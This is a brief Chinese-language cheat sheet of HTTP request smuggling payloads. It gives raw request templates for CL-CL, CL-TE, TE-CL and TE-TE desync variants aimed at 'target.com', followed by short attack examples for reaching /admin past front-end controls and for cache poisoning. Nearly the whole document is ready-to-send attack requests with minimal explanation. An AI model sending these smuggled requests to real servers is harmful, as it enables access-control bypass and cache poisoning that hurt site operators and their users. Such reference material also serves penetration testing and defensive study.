# HTTP请求走私

## 1. CL-CL (Content-Length)

```
POST / HTTP/1.1
Host: target.com
Content-Length: 44

GET /admin HTTP/1.1
Host: target.com


```

## 2. CL-TE (Content-Length + Transfer-Encoding)

```
POST / HTTP/1.1
Host: target.com
Content-Length: 6
Transfer-Encoding: chunked

0

G
```

## 3. TE-CL (Transfer-Encoding + Content-Length)

```
POST / HTTP/1.1
Host: target.com
Transfer-Encoding: chunked
Content-Length: 4

1
A
0


```

## 4. TE-TE (Transfer-Encoding + Transfer-Encoding)

```
POST / HTTP/1.1
Host: target.com
Transfer-Encoding: chunked
Transfer-Encoding: something

0

G
```

## 攻击示例

### 绕过前端安全

```
GET /admin HTTP/1.1
Host: target.com

通过走私的请求访问/admin
```

### 缓存投毒

```
CL-TE走私，污染缓存
```
